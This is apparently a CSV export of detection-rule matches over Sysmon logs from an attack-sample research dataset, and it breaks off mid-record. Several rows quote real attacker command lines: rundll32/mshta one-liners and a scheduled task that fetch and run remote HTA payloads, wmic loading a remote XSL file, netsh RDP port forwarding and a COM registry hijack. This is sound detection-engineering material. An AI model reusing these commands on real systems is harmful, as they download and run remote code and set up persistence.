2019-05-21T00:35:08.728057+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,1,384,IEWIN7,"Image: C:\Program Files\Mozilla Firefox\firefox.exe
RuleName: ''
Description: Firefox
TerminalSessionId: 1
ParentCommandLine: '""C:\Program Files\Mozilla Firefox\firefox.exe""'
Product: Firefox
Company: Mozilla Corporation
ParentProcessId: 3168
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=B18D536DA2242D6D9BB66CBE63CF312ABC9987A8,MD5=6AC1B75613E6143F94FF7A933B7993FC,SHA256=ABCE2767221B43127068C82BE7EBDF66FAA38B72F67676311FA4589075502A7F,IMPHASH=C5596CA4210F5F3474B68D7D54A73D16
ParentProcessGuid: 365ABB72-47BB-5CE3-0000-001053AF3E00
ProcessId: 2236
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-47BC-5CE3-0000-0010C6F03E00
CommandLine: '""C:\Program Files\Mozilla Firefox\firefox.exe"" -contentproc --channel=""3168.6.1176946839\1268428683"" -childID 1 -isForBrowser -prefsHandle 1844 -prefMapHandle 1836 -prefsLen 1 -prefMapSize 183351 -parentBuildID 20190507012018 -greomni ""C:\Program Files\Mozilla Firefox\omni.ja"" -appomni ""C:\Program Files\Mozilla Firefox\browser\omni.ja"" -appdir ""C:\Program Files\Mozilla Firefox\browser"" - 3168 ""\\.\pipe\gecko-crash-server-pipe.3168"" 1680 tab'
FileVersion: 66.0.5
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: Low
ParentImage: C:\Program Files\Mozilla Firefox\firefox.exe
UtcTime: 2019-05-21 00:35:08.661
"
2019-05-21T00:35:08.728057+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,1,383,IEWIN7,"Image: C:\Windows\System32\calc.exe
RuleName: ''
Description: Windows Calculator
TerminalSessionId: 1
ParentCommandLine: '""C:\Program Files\Mozilla Firefox\firefox.exe""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3168
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=9018A7D6CDBE859A430E8794E73381F77C840BE0,MD5=60B7C0FEAD45F2066E5B805A91F4F0FC,SHA256=80C10EE5F21F92F89CBC293A59D2FD4C01C7958AACAD15642558DB700943FA22,IMPHASH=F93B5D76132F6E6068946EC238813CE1
ParentProcessGuid: 365ABB72-47BB-5CE3-0000-001053AF3E00
ProcessId: 3860
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-47BC-5CE3-0000-001044EE3E00
CommandLine: '""C:\Windows\System32\calc.exe"" '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: High
ParentImage: C:\Program Files\Mozilla Firefox\firefox.exe
UtcTime: 2019-05-21 00:35:08.628
"
2019-05-21T00:35:10.161517+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,1,385,IEWIN7,"Image: C:\Program Files\Mozilla Firefox\firefox.exe
RuleName: ''
Description: Firefox
TerminalSessionId: 1
ParentCommandLine: '""C:\Program Files\Mozilla Firefox\firefox.exe""'
Product: Firefox
Company: Mozilla Corporation
ParentProcessId: 3168
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=B18D536DA2242D6D9BB66CBE63CF312ABC9987A8,MD5=6AC1B75613E6143F94FF7A933B7993FC,SHA256=ABCE2767221B43127068C82BE7EBDF66FAA38B72F67676311FA4589075502A7F,IMPHASH=C5596CA4210F5F3474B68D7D54A73D16
ParentProcessGuid: 365ABB72-47BB-5CE3-0000-001053AF3E00
ProcessId: 3920
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-47BE-5CE3-0000-0010CF0C3F00
CommandLine: '""C:\Program Files\Mozilla Firefox\firefox.exe"" -contentproc --channel=""3168.13.1464597065\1561502721"" -childID 2 -isForBrowser -prefsHandle 2432 -prefMapHandle 2436 -prefsLen 5401 -prefMapSize 183351 -parentBuildID 20190507012018 -greomni ""C:\Program Files\Mozilla Firefox\omni.ja"" -appomni ""C:\Program Files\Mozilla Firefox\browser\omni.ja"" -appdir ""C:\Program Files\Mozilla Firefox\browser"" - 3168 ""\\.\pipe\gecko-crash-server-pipe.3168"" 2448 tab'
FileVersion: 66.0.5
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: Low
ParentImage: C:\Program Files\Mozilla Firefox\firefox.exe
UtcTime: 2019-05-21 00:35:10.062
"
2019-05-21T00:35:12.705165+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,1,386,IEWIN7,"Image: C:\Program Files\Mozilla Firefox\firefox.exe
RuleName: ''
Description: Firefox
TerminalSessionId: 1
ParentCommandLine: '""C:\Program Files\Mozilla Firefox\firefox.exe""'
Product: Firefox
Company: Mozilla Corporation
ParentProcessId: 3168
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=B18D536DA2242D6D9BB66CBE63CF312ABC9987A8,MD5=6AC1B75613E6143F94FF7A933B7993FC,SHA256=ABCE2767221B43127068C82BE7EBDF66FAA38B72F67676311FA4589075502A7F,IMPHASH=C5596CA4210F5F3474B68D7D54A73D16
ParentProcessGuid: 365ABB72-47BB-5CE3-0000-001053AF3E00
ProcessId: 3372
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-47C0-5CE3-0000-00108D243F00
CommandLine: '""C:\Program Files\Mozilla Firefox\firefox.exe"" -contentproc --channel=""3168.20.1502540827\1989220046"" -childID 3 -isForBrowser -prefsHandle 3032 -prefMapHandle 3056 -prefsLen 6207 -prefMapSize 183351 -parentBuildID 20190507012018 -greomni ""C:\Program Files\Mozilla Firefox\omni.ja"" -appomni ""C:\Program Files\Mozilla Firefox\browser\omni.ja"" -appdir ""C:\Program Files\Mozilla Firefox\browser"" - 3168 ""\\.\pipe\gecko-crash-server-pipe.3168"" 3024 tab'
FileVersion: 66.0.5
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: Low
ParentImage: C:\Program Files\Mozilla Firefox\firefox.exe
UtcTime: 2019-05-21 00:35:12.474
"
2019-05-21T00:36:14.747769+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,13,387,IEWIN7,"Image: C:\Windows\system32\svchost.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\{6ACC3724-ED52-4080-9712-AD6B9F4CD7E3}\Category
RuleName: ''
EventType: SetValue
ProcessId: 816
ProcessGuid: 365ABB72-39CB-5CE3-0000-001046AA0000
UtcTime: 2019-05-21 00:36:14.737
Details: DWORD (0x00000001)
"
2019-05-21T00:36:14.747769+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Persistence/persist_firefox_comhijack_sysmon_11_13_7_1.evtx,1,Microsoft-Windows-Sysmon,13,388,IEWIN7,"Image: C:\Windows\system32\svchost.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\{6ACC3724-ED52-4080-9712-AD6B9F4CD7E3}\CategoryType
RuleName: ''
EventType: SetValue
ProcessId: 816
ProcessGuid: 365ABB72-39CB-5CE3-0000-001046AA0000
UtcTime: 2019-05-21 00:36:14.737
Details: DWORD (0x00000000)
"
2019-05-21T01:10:52.468297+00:00,Potential COM Object Hijacking Via TreatAs Subkey - Registry,data/EVTX-ATTACK-SAMPLES/Persistence/persist_turla_outlook_backdoor_comhijack.evtx,1,Microsoft-Windows-Sysmon,13,449,IEWIN7,"Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3583694148-1414552638-2922671848-1000_CLASSES\CLSID\{84DA0A92-25E0-11D3-B9F7-00C04F4C8F5D}\TreatAs\{Default}
RuleName: ''
EventType: SetValue
ProcessId: 2952
ProcessGuid: 365ABB72-501C-5CE3-0000-0010B5494900
UtcTime: 2019-05-21 01:10:52.458
Details: '{49CBB1C7-97D1-485A-9EC1-A26065633066}'
"
2019-05-21T15:32:57.286254+00:00,Hacktool - EDR-Freeze Execution;Mshtml.DLL RunHTMLApplication Suspicious Usage;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process;Wscript Shell Run In CommandLine,data/EVTX-ATTACK-SAMPLES/Execution/exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx,1,Microsoft-Windows-Sysmon,1,4125,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""cmd.exe"" /s /k pushd ""C:\Users\IEUser\Desktop""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3548
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-4F8A-5CE3-0000-0010C5BB4800
ProcessId: 1532
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 365ABB72-1A29-5CE4-0000-001054E32101
CommandLine: cmd.exe  /C rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%%20ActiveXObject(""WScript.Shell"").run(""mshta https://hotelesms.com/talsk.txt"",0,true);
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-21 15:32:57.276
"
2019-05-21T15:32:57.286254+00:00,Hacktool - EDR-Freeze Execution;Mshtml.DLL RunHTMLApplication Suspicious Usage;Rundll32 Execution With Uncommon DLL Extension;UAC Bypass Using NTFS Reparse Point - Process;Wscript Shell Run In CommandLine,data/EVTX-ATTACK-SAMPLES/Execution/exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx,1,Microsoft-Windows-Sysmon,1,4126,IEWIN7,"Image: C:\Windows\System32\rundll32.exe
RuleName: ''
Description: Windows host process (Rundll32)
TerminalSessionId: 1
ParentCommandLine: cmd.exe  /C rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%20ActiveXObject(""WScript.Shell"").run(""mshta https://hotelesms.com/talsk.txt"",0,true);
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1532
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=892503B20247B341CFD20DDA5FDACFA41527A087,MD5=C648901695E275C8F2AD04B687A68CE2,SHA256=3FA4912EB43FC304652D7B01F118589259861E2D628FA7C86193E54D5F987670,IMPHASH=239D911DFA7551A8B735680BC39B2238
ParentProcessGuid: 365ABB72-1A29-5CE4-0000-001054E32101
ProcessId: 2920
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 365ABB72-1A29-5CE4-0000-00107BE42101
CommandLine: rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%%20ActiveXObject(""WScript.Shell"").run(""mshta https://hotelesms.com/talsk.txt"",0,true);
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-21 15:32:57.276
"
2019-05-21T15:32:57.867089+00:00,Hacktool - EDR-Freeze Execution;MSHTA Execution with Suspicious File Extensions;Remotely Hosted HTA File Executed Via Mshta.EXE;UAC Bypass Using NTFS Reparse Point - Process;Windows Shell/Scripting Processes Spawning Suspicious Programs,data/EVTX-ATTACK-SAMPLES/Execution/exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx,1,Microsoft-Windows-Sysmon,1,4127,IEWIN7,"Image: C:\Windows\System32\mshta.exe
RuleName: ''
Description: Microsoft (R) HTML Application host
TerminalSessionId: 1
ParentCommandLine: rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%20ActiveXObject(""WScript.Shell"").run(""mshta https://hotelesms.com/talsk.txt"",0,true);
Product: Internet Explorer
Company: Microsoft Corporation
ParentProcessId: 2920
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=D4F0397F83083E1C6FB0894187CC72AEBCF2F34F,MD5=ABDFC692D9FE43E2BA8FE6CB5A8CB95A,SHA256=949485BA939953642714AE6831D7DCB261691CAC7CBB8C1A9220333801F60820,IMPHASH=00B1859A95A316FD37DFF4210480907A
ParentProcessGuid: 365ABB72-1A29-5CE4-0000-00107BE42101
ProcessId: 2432
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 365ABB72-1A29-5CE4-0000-001079F92101
CommandLine: '""C:\Windows\System32\mshta.exe"" https://hotelesms.com/talsk.txt'
FileVersion: 11.00.9600.16428 (winblue_gdr.131013-1700)
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: High
ParentImage: C:\Windows\System32\rundll32.exe
UtcTime: 2019-05-21 15:32:57.837
"
2019-05-21T15:32:59.769825+00:00,Hacktool - EDR-Freeze Execution;Scheduled Task Creation Via Schtasks.EXE;Suspicious Command Patterns In Scheduled Task Creation;UAC Bypass Using NTFS Reparse Point - Process;Windows Shell/Scripting Processes Spawning Suspicious Programs,data/EVTX-ATTACK-SAMPLES/Execution/exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx,1,Microsoft-Windows-Sysmon,1,4129,IEWIN7,"Image: C:\Windows\System32\schtasks.exe
RuleName: ''
Description: Manages scheduled tasks
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\mshta.exe"" https://hotelesms.com/talsk.txt'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2432
LogonGuid: 365ABB72-39CC-5CE3-0000-002096C70000
Hashes: SHA1=8A7E8B05A122B768AB85466B2A3DAF7A358F90F4,MD5=2003E9B15E1C502B146DAD2E383AC1E3,SHA256=15018D0093BEFABBA8B927743191030D1F8C17BB97FDB48C2FC3EAB20E2D4B3D,IMPHASH=D92C80D49382091310FB8DB089F856A9
ParentProcessGuid: 365ABB72-1A29-5CE4-0000-001079F92101
ProcessId: 3772
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 365ABB72-1A2B-5CE4-0000-00102F502201
CommandLine: '""C:\Windows\System32\schtasks.exe"" /Create /sc MINUTE /MO 60 /TN MSOFFICE_ /TR ""mshta.exe https://hotelesms.com/Injection.txt"" /F '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0xc796'
IntegrityLevel: High
ParentImage: C:\Windows\System32\mshta.exe
UtcTime: 2019-05-21 15:32:59.729
"
2019-05-22T04:02:11.307031+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/exec_driveby_cve-2018-15982_sysmon_1_10.evtx,1,Microsoft-Windows-Sysmon,1,839,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Program Files\Internet Explorer\iexplore.exe"" SCODEF:1600 CREDAT:275470 /prefetch:2'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3156
LogonGuid: 365ABB72-C32E-5CE4-0000-00205DF00000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-C9C1-5CE4-0000-00100B222E00
ProcessId: 2888
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 365ABB72-C9C3-5CE4-0000-00101F422E00
CommandLine: cmd.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0xf05d'
IntegrityLevel: High
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
UtcTime: 2019-05-22 04:02:11.287
"
2019-05-23T16:49:05.736570+00:00,Hacktool - EDR-Freeze Execution;Potential Process Reconnaissance via Wmic.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/exec_wmic_xsl_internet_sysmon_3_1_11.evtx,1,Microsoft-Windows-Sysmon,1,892,IEWIN7,"Image: C:\Windows\System32\wbem\WMIC.exe
RuleName: ''
Description: WMI Commandline Utility
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2940
LogonGuid: 365ABB72-CE6C-5CE6-0000-002047F30000
Hashes: SHA1=4368DBD172224EC9461364BE1AC9DFFC5D9224A8,MD5=A03CF3838775E0801A0894C8BACD2E56,SHA256=132AA270790F56A7524CAB968927ED5E1D91B9A26D4BADCB24E450E7DECC5F81,IMPHASH=B59AF26B08AA14BA66272388BC9C2443
ParentProcessGuid: 365ABB72-CE84-5CE6-0000-001094130600
ProcessId: 3872
CurrentDirectory: c:\
ProcessGuid: 365ABB72-CF01-5CE6-0000-00105DA50C00
CommandLine: wmic  process list /format:""https://a.uguu.se/x50IGVBRfr55_test.xsl""
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0xf347'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-23 16:49:05.686
"
2019-05-23T16:49:07.731893+00:00,UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/Execution/exec_wmic_xsl_internet_sysmon_3_1_11.evtx,1,Microsoft-Windows-Sysmon,11,894,IEWIN7,"ProcessGuid: 365ABB72-CF01-5CE6-0000-00105DA50C00
CreationUtcTime: 2019-05-23 16:49:07.731
UtcTime: 2019-05-23 16:49:07.731
ProcessId: 3872
RuleName: ''
TargetFilename: C:\Users\IEUser\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\S97WTYG7\x50IGVBRfr55_test[1].xsl
Image: C:\Windows\System32\Wbem\WMIC.exe
"
2019-05-23T16:49:08.422099+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/exec_wmic_xsl_internet_sysmon_3_1_11.evtx,1,Microsoft-Windows-Sysmon,1,896,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: wmic  process list /format:""https://a.uguu.se/x50IGVBRfr55_test.xsl""
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3872
LogonGuid: 365ABB72-CE6C-5CE6-0000-002047F30000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-CF01-5CE6-0000-00105DA50C00
ProcessId: 4056
CurrentDirectory: c:\
ProcessGuid: 365ABB72-CF04-5CE6-0000-001010F20C00
CommandLine: '""C:\Windows\System32\cmd.exe"" '
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0xf347'
IntegrityLevel: High
ParentImage: C:\Windows\System32\wbem\WMIC.exe
UtcTime: 2019-05-23 16:49:08.258
"
2019-05-23T16:50:44.582500+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/exec_wmic_xsl_internet_sysmon_3_1_11.evtx,1,Microsoft-Windows-Sysmon,1,898,IEWIN7,"Image: C:\Windows\System32\wbem\WMIADAP.exe
RuleName: ''
Description: WMI Reverse Performance Adapter Maintenance Utility
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 896
LogonGuid: 365ABB72-4CF8-5CE7-0000-0020E7030000
Hashes: SHA1=DC6DC543EAC398DE6821325BFF3625C1CFC8EC3D,MD5=52799EAD792B0E9AE7FD4BA5BD18FE5C,SHA256=BE4838F4DB23D56CF75730DD36451C5F0F2ACA36B8A74844E7675DC5D5AD0C58,IMPHASH=FAAD498DDAEF07E1AF22EEF06D02AE2C
ParentProcessGuid: 365ABB72-CE6B-5CE6-0000-001003D30000
ProcessId: 708
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 365ABB72-CF64-5CE6-0000-0010CBD51100
CommandLine: wmiadap.exe /F /T /R
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-05-23 16:50:44.430
"
2019-05-23T17:26:08.716859+00:00,Hacktool - EDR-Freeze Execution;Msxsl.EXE Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/exec_msxsl_xsl_sysmon_1_7.evtx,1,Microsoft-Windows-Sysmon,1,1017,IEWIN7,"Image: \\vboxsrv\HTools\msxsl.exe
RuleName: ''
Description: msxsl
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\System32\cmd.exe"" '
Product: Command Line XSLT
Company: Microsoft
ParentProcessId: 2236
LogonGuid: 365ABB72-CE6C-5CE6-0000-002047F30000
Hashes: SHA1=8B516E7BE14172E49085C4234C9A53C6EB490A45,MD5=3E9F31B4E2CD423C015D34D63047685E,SHA256=35BA7624F586086F32A01459FCC0AB755B01B49D571618AF456AA49E593734C7,IMPHASH=2477F6A819520981112AD254E2BD87D8
ParentProcessGuid: 365ABB72-D2D4-5CE6-0000-001047EA6400
ProcessId: 3388
CurrentDirectory: D:\
ProcessGuid: 365ABB72-D7B0-5CE6-0000-001077C56D00
CommandLine: msxsl.exe  c:\Users\IEUser\AppData\Roaming\Adobe\test.dat c:\Users\IEUser\AppData\Roaming\Adobe\test.dat
FileVersion: 1.1.0.1
User: IEWIN7\IEUser
LogonId: '0xf347'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-23 17:26:08.686
"
2019-05-23T17:26:09.437896+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Execution/exec_msxsl_xsl_sysmon_1_7.evtx,1,Microsoft-Windows-Sysmon,1,1019,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: msxsl.exe  c:\Users\IEUser\AppData\Roaming\Adobe\test.dat c:\Users\IEUser\AppData\Roaming\Adobe\test.dat
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3388
LogonGuid: 365ABB72-CE6C-5CE6-0000-002047F30000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-D7B0-5CE6-0000-001077C56D00
ProcessId: 2240
CurrentDirectory: D:\
ProcessGuid: 365ABB72-D7B1-5CE6-0000-00102CD76D00
CommandLine: '""C:\Windows\System32\cmd.exe"" '
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0xf347'
IntegrityLevel: High
ParentImage: \\vboxsrv\HTools\msxsl.exe
UtcTime: 2019-05-23 17:26:09.417
"
2019-05-23T17:45:34.538296+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_portforward_netsh_rdp_sysmon_13_1.evtx,1,Microsoft-Windows-Sysmon,1,1025,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: C:\Windows\Explorer.EXE
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1472
LogonGuid: 365ABB72-CE6C-5CE6-0000-002047F30000
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-CE6D-5CE6-0000-00109E190100
ProcessId: 712
CurrentDirectory: C:\Users\IEUser\
ProcessGuid: 365ABB72-DC3E-5CE6-0000-00102BC97200
CommandLine: '""C:\Windows\system32\cmd.exe"" '
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
User: IEWIN7\IEUser
LogonId: '0xf347'
IntegrityLevel: High
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-05-23 17:45:34.528
"
2019-05-23T17:46:04.671625+00:00,Hacktool - EDR-Freeze Execution;New Port Forwarding Rule Added Via Netsh.EXE;RDP Port Forwarding Rule Added Via Netsh.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_portforward_netsh_rdp_sysmon_13_1.evtx,1,Microsoft-Windows-Sysmon,1,1026,IEWIN7,"Image: C:\Windows\System32\netsh.exe
RuleName: ''
Description: Network Command Shell
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 712
LogonGuid: 365ABB72-CE6C-5CE6-0000-002047F30000
Hashes: SHA1=7DA1852DF83C58841AD35248AD2A20D7FFBB7FA0,MD5=784A50A6A09C25F011C3143DDD68E729,SHA256=661F5D4CE4F0A6CB32669A43CE5DEEC6D5A9E19B2387F22C5012405E92169943,IMPHASH=33B8120C37D7861778989FBFD16214E1
ParentProcessGuid: 365ABB72-DC3E-5CE6-0000-00102BC97200
ProcessId: 4088
CurrentDirectory: c:\
ProcessGuid: 365ABB72-DC5C-5CE6-0000-001066E27200
CommandLine: netsh  I p a v l=8001 listena=1.2.3.4 connectp=3389 c=1.2.3.5
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0xf347'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-05-23 17:46:04.651
"
2019-05-23T17:46:05.022129+00:00,New PortProxy Registry Entry Added;Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Defense Evasion/de_portforward_netsh_rdp_sysmon_13_1.evtx,1,Microsoft-Windows-Sysmon,13,1027,IEWIN7,"Image: C:\Windows\system32\netsh.exe
TargetObject: HKLM\System\CurrentControlSet\services\PortProxy\v4tov4\tcp\1.2.3.4/8001
RuleName: ''
EventType: SetValue
ProcessId: 4088
ProcessGuid: 365ABB72-DC5C-5CE6-0000-001066E27200
UtcTime: 2019-05-23 17:46:05.022
Details: 1.2.3.5/3389
"
2019-05-24T01:33:53.112486+00:00,Hacktool - EDR-Freeze Execution;Suspicious Process By Web Server Process;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_typical_IIS_webshell_sysmon_1_10_traces.evtx,1,Microsoft-Windows-Sysmon,1,1044,IEWIN7,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: c:\windows\system32\inetsrv\w3wp.exe -ap ""DefaultAppPool"" -v ""v2.0"" -l ""webengine4.dll"" -a \\.\pipe\iisipm719e5ea8-b97b-40d0-96b6-44cca91790fe -h ""C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config"" -w """" -m 0 -t 20
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2580
LogonGuid: 365ABB72-45C7-5CE7-0000-002092F99C00
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163
ParentProcessGuid: 365ABB72-49D6-5CE7-0000-001020A7A700
ProcessId: 2404
